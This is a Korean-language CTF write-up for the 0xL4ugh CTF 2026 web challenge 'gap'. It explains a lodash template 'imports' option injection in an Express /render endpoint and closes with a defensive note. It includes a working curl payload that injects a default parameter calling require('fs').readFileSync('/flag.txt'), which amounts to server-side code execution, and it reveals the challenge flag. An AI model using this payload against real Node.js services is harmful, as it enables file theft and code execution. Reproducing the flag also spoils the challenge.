---
title: "0xL4ugh CTF 2026 | gap"
date: 2026-01-26 01:00:00 +0900
categories: [0xL4ugh CTF 2026, Web]
tags: [Web]
toc: true
comments: false
---

## TL;DR
`/render`가 **요청 JSON(req.body)** 를 그대로 lodash 템플릿 렌더링에 넘기면서,  
데이터(locals)와 함께 **템플릿 컴파일 옵션(options)** 까지 오염된다.    
그 결과 `imports` 옵션을 **Template Option Injection** 형태로 주입해, 템플릿 함수의 파라미터/기본값을 조작하고  
`input`을 `/flag.txt` 내용으로 덮어써서 플래그를 얻는다.  

✅ Flag: `0xL4ugh{L0d4sh_G0t_N0_Ch1ll_f976a9976eb47af4}`

---

## Overview
`web/gap`은 Node.js + Express로 구현된 간단한 렌더링 서비스다.

- 엔드포인트: `POST /render`
- 동작: 고정 템플릿(예: `<%= input %>`)에 대해 요청 본문을 렌더링 데이터로 사용
- 플래그: 서버 내부 파일 **`/flag.txt`**

표면적으로는 `<%= input %>`에 단순 문자열만 들어가므로 “정상적인 SSTI”가 안 보이지만,  
실제 문제는 **lodash template의 컴파일 단계 옵션 주입**에 있다.

---

## Solution

### 1) Recon
관찰 포인트는 두 가지다.

- 템플릿은 고정이고(`<%= input %>`), 출력은 `input` 하나만 찍힌다.
- 그런데 `req.body` 전체가 템플릿 처리 흐름에 들어가면, lodash 템플릿 엔진이 쓰는 **options(컴파일 옵션)** 과 충돌/병합될 수 있다.

즉, “템플릿 문자열을 뚫는다”가 아니라 “템플릿을 만드는 옵션을 오염시킨다”가 핵심이다.

---

### 2) Root cause
lodash의 `_.template`는 대략 아래 형태로 동작한다.

- `compiled = _.template(tplString, options)`
- `compiled(data)` 로 렌더링

문제 서버는 `req.body`를 **data로만 제한하지 않고**, 내부 구현에서 병합/전달을 잘못해
`req.body.imports` 같은 값이 **options.imports**로 들어가도록 만들었다.

그리고 lodash template에서 `imports`는 컴파일 시 생성되는 함수 스코프(파라미터/지역 변수)에 영향을 준다.  
이 특성을 이용하면 **함수 파라미터 목록/기본값(default parameter)** 를 깨뜨리는 방식으로 임의 JS를 실행할 수 있다.

---

### 3) Exploit (PoC)

#### (1) 정상 출력 확인
```bash
curl -s -X POST "http://challenges4.ctf.sd:34454/render" \
  -H "Content-Type: application/json" \
  --data-binary '{"input":"hello"}'
```

- 출력: `hello`

#### (2) `imports` 옵션 주입으로 `/flag.txt` 읽기
아이디어:
- `imports`의 키가 내부적으로 **함수 파라미터처럼 사용되는 부분**을 노려,
- `input`에 `= <expr>` 형태의 **기본값**을 달아 `/flag.txt`를 읽게 만든다.

```bash
curl -s -X POST "http://challenges4.ctf.sd:34454/render" \
  -H "Content-Type: application/json" \
  --data-binary '{"imports":{"a,b,input=global.process.mainModule.require(\"fs\").readFileSync(\"/flag.txt\",\"utf8\")":1}}'
```

- 출력: `0xL4ugh{...}`

---

### 4) Why it works
- 템플릿은 `<%= input %>`만 찍는다.
- 하지만 컴파일 옵션 `imports`를 조작하면, “`input`이라는 심볼이 어디서/어떻게 결정되는지”를 바꿀 수 있다.
- `input=<읽기코드>` 형태의 기본값을 주면, 렌더링 시점에 `input`이 `/flag.txt` 내용으로 평가되어 그대로 출력된다.

---

## Solver
### solve.py
```bash
python3 solve.py --url "http://challenges4.ctf.sd:34454"
```

---

## Notes
- 이건 `<%= input %>`에 대한 “전형적인 SSTI”가 아니라,  
  **lodash template 컴파일 옵션(imports) 주입**으로 발생하는 **Template Option Injection** 케이스다.  
- 방어 관점에선 `req.body`를 options로 병합하지 말고, `data/option` 경계를 분리하고 allowlist를 적용해야 한다.

